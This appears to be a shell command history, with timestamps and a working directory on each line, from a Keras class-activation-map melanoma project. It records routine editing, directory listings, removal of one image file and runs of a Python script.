+vi data.py ### @f5e57551b879 not a tty 20161224 10:53 /datamnt/github/keras-cam-melanoma
+vi data.py ### @f5e57551b879 not a tty 20161224 10:54 /datamnt/github/keras-cam-melanoma
+vi data.py ### @f5e57551b879 not a tty 20161224 10:56 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161224 11:01 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161224 11:01 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161224 11:01 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161224 11:04 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161224 11:05 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161224 11:05 /datamnt/github/keras-cam-melanoma
+rm 558d6142bae47801cf7347b0.jpg  ### @f5e57551b879 not a tty 20161224 11:05 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161224 11:05 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161224 11:05 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161224 11:06 /datamnt/github/keras-cam-melanoma
+python cam.py ### @f5e57551b879 not a tty 20161224 11:06 /datamnt/github/keras-cam-melanoma
+python cam.py ### @f5e57551b879 not a tty 20161224 11:06 /datamnt/github/keras-cam-melanoma
+ ### @f5e57551b879 not a tty 20161224 11:06 /datamnt/github/keras-cam-melanoma
+grep trainsmall ~/histlog  ### @f5e57551b879 not a tty 20161224 11:07 /datamnt/github/keras-cam-melanoma
